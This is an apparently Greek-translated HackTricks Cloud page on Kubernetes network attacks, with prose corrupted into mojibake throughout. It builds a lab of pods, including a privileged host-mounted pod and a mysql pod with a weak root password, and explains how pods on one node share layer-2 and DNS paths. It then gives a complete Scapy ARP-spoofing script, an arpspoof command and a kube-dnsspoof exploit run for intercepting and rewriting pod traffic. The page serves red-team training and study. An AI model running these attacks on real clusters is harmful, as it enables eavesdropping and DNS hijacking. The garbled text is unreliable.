# Kubernetes Network Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Î•Î¹ÏƒÎ±Î³Ï‰Î³Î®

Î£Ï„Î¿ Kubernetes, Ï€Î±ÏÎ±Ï„Î·ÏÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î¹ Î¼Î¹Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÎ³ÎºÎ±Î¸Î¯Î´ÏÏ…ÏƒÎ· ÏƒÏ…Î½Î´Î­ÏƒÎµÏ‰Î½ Î¼ÎµÏ„Î±Î¾Ï **ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ Î¯Î´Î¹Î¿ ÎºÏŒÎ¼Î²Î¿**. Î‘Ï…Ï„ÏŒ Î¹ÏƒÏ‡ÏÎµÎ¹ Î±Î½ÎµÎ¾Î±ÏÏ„Î®Ï„Ï‰Ï‚ Ï„Ï‰Î½ Î´Î¹Î±ÎºÏÎ¯ÏƒÎµÏ‰Î½ namespace. Î‘Ï…Ï„Î® Î· ÏƒÏ…Î½Î´ÎµÏƒÎ¹Î¼ÏŒÏ„Î·Ï„Î± ÎµÏ€ÎµÎºÏ„ÎµÎ¯Î½ÎµÏ„Î±Î¹ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿ **Layer 2** (Ethernet). Î©Ï‚ ÎµÎº Ï„Î¿ÏÏ„Î¿Ï…, Î±Ï…Ï„Î® Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· ÎµÎ½Î´Î­Ï‡ÎµÏ„Î±Î¹ Î½Î± ÎµÎºÎ¸Î­ÏƒÎµÎ¹ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± ÏƒÎµ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚. Î£Ï…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î±, Î±Î½Î¿Î¯Î³ÎµÎ¹ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î³Î¹Î± Î­Î½Î± **ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ** Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î¹Î± **ÎµÏ€Î¯Î¸ÎµÏƒÎ· ARP spoofing** ÎºÎ±Ï„Î¬ Î¬Î»Î»Ï‰Î½ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ Î¯Î´Î¹Î¿ ÎºÏŒÎ¼Î²Î¿. ÎšÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Î¼Î¹Î±Ï‚ Ï„Î­Ï„Î¿Î¹Î±Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚, Ï„Î¿ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÎµÎ¹ Î® Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î´ÏŒÎ»Î¹Î± Ï„Î·Î½ ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î± Î´Î¹ÎºÏ„ÏÎ¿Ï… Ï€Î¿Ï… Ï€ÏÎ¿Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î³Î¹Î± Î¬Î»Î»Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ.

ÎŸÎ¹ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ ARP spoofing Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ Ï„Î¿Î½ **ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± ÏƒÏ„Î­Î»Î½ÎµÎ¹ ÏˆÎµÏ…Î´ÎµÎ¯Ï‚ ARP** (Address Resolution Protocol) Î¼Î·Î½ÏÎ¼Î±Ï„Î± Î¼Î­ÏƒÏ‰ ÎµÎ½ÏŒÏ‚ Ï„Î¿Ï€Î¹ÎºÎ¿Ï Î´Î¹ÎºÏ„ÏÎ¿Ï…. Î‘Ï…Ï„ÏŒ Î­Ï‡ÎµÎ¹ Ï‰Ï‚ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ· Ï„Î·Ï‚ **Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ MAC Ï„Î¿Ï… ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï… Î¼Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP ÎµÎ½ÏŒÏ‚ Î½ÏŒÎ¼Î¹Î¼Î¿Ï… Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® Î® Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿**. ÎœÎµÏ„Î¬ Ï„Î·Î½ ÎµÏ€Î¹Ï„Ï…Ï‡Î® ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î¼Î¹Î±Ï‚ Ï„Î­Ï„Î¿Î¹Î±Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÎµÎ¹, Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î® Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Î½Î± ÏƒÏ„Î±Î¼Î±Ï„Î®ÏƒÎµÎ¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÎµ Î¼ÎµÏ„Î±Ï†Î¿ÏÎ¬. Î— ÎµÏ€Î¯Î¸ÎµÏƒÎ· ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î¿ Layer 2 Ï„Î¿Ï… Î¼Î¿Î½Ï„Î­Î»Î¿Ï… OSI, Î³Î¹' Î±Ï…Ï„ÏŒ ÎºÎ±Î¹ Î· Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· ÏƒÏ…Î½Î´ÎµÏƒÎ¹Î¼ÏŒÏ„Î·Ï„Î± ÏƒÏ„Î¿ Kubernetes ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ ÎµÎ³ÎµÎ¯ÏÎµÎ¹ Î±Î½Î·ÏƒÏ…Ï‡Î¯ÎµÏ‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚.

Î£Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿, Î¸Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸Î¿ÏÎ½ 4 Î¼Î·Ï‡Î±Î½Î­Ï‚:

* ubuntu-pe: ÎœÎ·Ï‡Î±Î½Î® Î¼Îµ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î³Î¹Î± Î½Î± Î´Î¹Î±Ï†ÏÎ³ÎµÎ¹ ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ ÎºÎ±Î¹ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Î¼ÎµÏ„ÏÎ®ÏƒÎµÎ¹Ï‚ (Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î· Î³Î¹Î± Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ·)
* **ubuntu-attack**: **ÎšÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿** ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ ÏƒÏ„Î¿ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ namespace
* **ubuntu-victim**: **Î˜ÏÎ¼Î±** Î¼Î·Ï‡Î±Î½Î® ÏƒÏ„Î¿ kube-system namespace
* **mysql**: **Î˜ÏÎ¼Î±** Î¼Î·Ï‡Î±Î½Î® ÏƒÏ„Î¿ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ namespace
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Î’Î±ÏƒÎ¹ÎºÎ¬ Î”Î¯ÎºÏ„Ï…Î± Kubernetes

Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î± Î¸Î­Î¼Î±Ï„Î± Î´Î¹ÎºÏ„ÏÏ‰ÏƒÎ·Ï‚ Ï€Î¿Ï… ÎµÎ¹ÏƒÎ¬Î³Î¿Î½Ï„Î±Î¹ ÎµÎ´Ï, Ï€Î·Î³Î±Î¯Î½ÎµÏ„Îµ ÏƒÏ„Î¹Ï‚ Î±Î½Î±Ï†Î¿ÏÎ­Ï‚.

### ARP

Î“ÎµÎ½Î¹ÎºÎ¬ Î¼Î¹Î»ÏÎ½Ï„Î±Ï‚, **Î· Î´Î¹ÎºÏ„ÏÏ‰ÏƒÎ· pod-to-pod Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿** ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· Î¼Î­ÏƒÏ‰ Î¼Î¹Î±Ï‚ **Î³Î­Ï†Ï…ÏÎ±Ï‚** Ï€Î¿Ï… ÏƒÏ…Î½Î´Î­ÎµÎ¹ ÏŒÎ»Î± Ï„Î± pods. Î‘Ï…Ï„Î® Î· Î³Î­Ï†Ï…ÏÎ± Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ â€œ**cbr0**â€. (ÎŸÏÎ¹ÏƒÎ¼Î­Î½Î± plugins Î´Î¹ÎºÏ„ÏÏ‰ÏƒÎ·Ï‚ Î¸Î± ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎ¿Ï…Î½ Ï„Î· Î´Î¹ÎºÎ® Ï„Î¿Ï…Ï‚ Î³Î­Ï†Ï…ÏÎ±.) Î— **cbr0 Î¼Ï€Î¿ÏÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ ARP** (Î ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ Î•Ï€Î¯Î»Ï…ÏƒÎ·Ï‚ Î”Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½). ÎŒÏ„Î±Î½ Î­Î½Î± ÎµÎ¹ÏƒÎµÏÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï€Î±ÎºÎ­Ï„Î¿ Ï†Ï„Î¬Î½ÎµÎ¹ ÏƒÏ„Î¿ cbr0, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Î»ÏÏƒÎµÎ¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· MAC Ï€ÏÎ¿Î¿ÏÎ¹ÏƒÎ¼Î¿Ï Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ARP.

Î‘Ï…Ï„ÏŒ Ï„Î¿ Î³ÎµÎ³Î¿Î½ÏŒÏ‚ Ï…Ï€Î¿Î´Î·Î»ÏÎ½ÎµÎ¹ ÏŒÏ„Î¹, Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, **ÎºÎ¬Î¸Îµ pod Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î¿Î½ Î¯Î´Î¹Î¿ ÎºÏŒÎ¼Î²Î¿** Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½ÎµÎ¯** Î¼Îµ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î¿ pod ÏƒÏ„Î¿Î½ Î¯Î´Î¹Î¿ ÎºÏŒÎ¼Î²Î¿ (Î±Î½ÎµÎ¾Î¬ÏÏ„Î·Ï„Î± Î±Ï€ÏŒ Ï„Î¿ namespace) ÏƒÎµ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ ethernet (ÎµÏ€Î¯Ï€ÎµÎ´Î¿ 2).

{% hint style="warning" %}
Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ A**RP Spoofing Î¼ÎµÏ„Î±Î¾Ï pods ÏƒÏ„Î¿Î½ Î¯Î´Î¹Î¿ ÎºÏŒÎ¼Î²Î¿.**
{% endhint %}

### DNS

Î£Îµ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î± kubernetes, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î¸Î± Î²ÏÎµÎ¯Ï„Îµ 1 (Î® Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚) **Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ DNS Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹** ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÏƒÏ„Î¿ namespace kube-system:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
Î£Ï„Î¹Ï‚ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÎºÎ¬Ï„Î¹ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½, Ï„Î¿ **IP Ï„Î·Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚** ÎµÎ¯Î½Î±Î¹ **10.96.0.10** Î±Î»Î»Î¬ Ï„Î¿ **IP Ï„Î¿Ï… pod** Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± ÎµÎ¯Î½Î±Î¹ **172.17.0.2.**

Î‘Î½ ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· DNS Î¼Î­ÏƒÎ± ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ pod Î¸Î± Î²ÏÎµÎ¯Ï„Îµ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½ Î±Ï…Ï„ÏŒ:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
Î©ÏƒÏ„ÏŒÏƒÎ¿, Ï„Î¿ pod **Î´ÎµÎ½ Î¾Î­ÏÎµÎ¹** Ï€ÏÏ‚ Î½Î± Ï†Ï„Î¬ÏƒÎµÎ¹ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î· **Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·** ÎµÏ€ÎµÎ¹Î´Î® Ï„Î¿ **ÎµÏÏÎ¿Ï‚ pod** ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· ÎµÎ¯Î½Î±Î¹ 172.17.0.10/26.

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Ï„Î¿ pod Î¸Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Ï„Î± **DNS requests ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· 10.96.0.10** Ï€Î¿Ï… Î¸Î± **Î¼ÎµÏ„Î±Ï†ÏÎ±ÏƒÏ„ÎµÎ¯** Î±Ï€ÏŒ Ï„Î¿ cbr0 **ÏƒÎµ** **172.17.0.2**.

{% hint style="warning" %}
Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î­Î½Î± **DNS request** ÎµÎ½ÏŒÏ‚ pod Î¸Î± **Ï€Î·Î³Î±Î¯Î½ÎµÎ¹ Ï€Î¬Î½Ï„Î±** ÏƒÏ„Î· **Î³Î­Ï†Ï…ÏÎ±** Î³Î¹Î± Î½Î± **Î¼ÎµÏ„Î±Ï†ÏÎ¬ÏƒÎµÎ¹** Ï„Î¿ **service IP ÏƒÎµ endpoint IP**, Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Î±Î½ Î¿ DNS server ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î·Î½ Î¯Î´Î¹Î± Ï…Ï€Î¿Î´Î¯ÎºÏ„Ï…Î¿ Î¼Îµ Ï„Î¿ pod.

Î“Î½Ï‰ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Î±Ï…Ï„ÏŒ, ÎºÎ±Î¹ Î³Î½Ï‰ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ ÏŒÏ„Î¹ **ARP ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î­Ï‚**, Î­Î½Î± **pod** ÏƒÎµ Î­Î½Î±Î½ ÎºÏŒÎ¼Î²Î¿ Î¸Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± **Ï€Î±ÏÎµÎ¼Î²Î¬Î»Î»ÎµÎ¹ Ï„Î·Î½ ÎºÎ¯Î½Î·ÏƒÎ·** Î¼ÎµÏ„Î±Î¾Ï **ÎºÎ¬Î¸Îµ pod** ÏƒÏ„Î¿ **Ï…Ï€Î¿Î´Î¯ÎºÏ„Ï…Î¿** ÎºÎ±Î¹ Ï„Î· **Î³Î­Ï†Ï…ÏÎ±** ÎºÎ±Î¹ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹** Ï„Î¹Ï‚ **DNS Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚** Î±Ï€ÏŒ Ï„Î¿Î½ DNS server (**DNS Spoofing**).

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Î½ Î¿ **DNS server** ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î¿Î½ **Î¯Î´Î¹Î¿ ÎºÏŒÎ¼Î²Î¿ Î¼Îµ Ï„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿**, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Ï€Î±ÏÎµÎ¼Î²Î¬Î»Î»ÎµÎ¹ ÏŒÎ»Î± Ï„Î± DNS requests** Î¿Ï€Î¿Î¹Î¿Ï…Î´Î®Ï€Î¿Ï„Îµ pod ÏƒÏ„Î¿ cluster (Î¼ÎµÏ„Î±Î¾Ï Ï„Î¿Ï… DNS server ÎºÎ±Î¹ Ï„Î·Ï‚ Î³Î­Ï†Ï…ÏÎ±Ï‚) ÎºÎ±Î¹ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¹Ï‚ Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚.
{% endhint %}

## ARP Spoofing ÏƒÎµ pods ÏƒÏ„Î¿Î½ Î¯Î´Î¹Î¿ ÎšÏŒÎ¼Î²Î¿

Î£Ï„ÏŒÏ‡Î¿Ï‚ Î¼Î±Ï‚ ÎµÎ¯Î½Î±Î¹ Î½Î± **ÎºÎ»Î­ÏˆÎ¿Ï…Î¼Îµ Ï„Î¿Ï…Î»Î¬Ï‡Î¹ÏƒÏ„Î¿Î½ Ï„Î·Î½ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Î±Ï€ÏŒ Ï„Î¿Î½ ubuntu-victim Ï€ÏÎ¿Ï‚ Ï„Î¿Î½ mysql**.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

ÎŒÏ€Ï‰Ï‚ Î±Î½Î±Ï†Î­ÏÎ¸Î·ÎºÎµ Î®Î´Î·, Î±Î½ **Ï€Î±ÏÎ±Î²Î¹Î¬ÏƒÎµÏ„Îµ Î­Î½Î± pod ÏƒÏ„Î¿Î½ Î¯Î´Î¹Î¿ ÎºÏŒÎ¼Î²Î¿ Î¼Îµ Ï„Î¿ pod Ï„Î¿Ï… DNS server**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **MitM** Î¼Îµ **ARPSpoofing** Ï„Î¿ **bridge ÎºÎ±Î¹ Ï„Î¿ DNS** pod ÎºÎ±Î¹ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ DNS**.

ÎˆÏ‡ÎµÏ„Îµ Î­Î½Î± Ï€Î¿Î»Ï Ï‰ÏÎ±Î¯Î¿ **ÎµÏÎ³Î±Î»ÎµÎ¯Î¿** ÎºÎ±Î¹ **tutorial** Î³Î¹Î± Î½Î± Ï„Î¿ Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ ÏƒÏ„Î¿ [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

Î£Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹ÏŒ Î¼Î±Ï‚, **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ** Ï„Î¿ **ÎµÏÎ³Î±Î»ÎµÎ¯Î¿** ÏƒÏ„Î¿ pod Ï„Î¿Ï… ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï… ÎºÎ±Î¹ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î± \*\*Î±ÏÏ‡ÎµÎ¯Î¿ Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± `hosts` \*\* Î¼Îµ Ï„Î± **domains** Ï€Î¿Ï… Î¸Î­Î»ÎµÏ„Îµ Î½Î± **spoof** ÏŒÏ€Ï‰Ï‚:
```
cat hosts
google.com. 1.1.1.1
```
Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· ÏƒÏ„Î· Î¼Î·Ï‡Î±Î½Î® ubuntu-victim:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
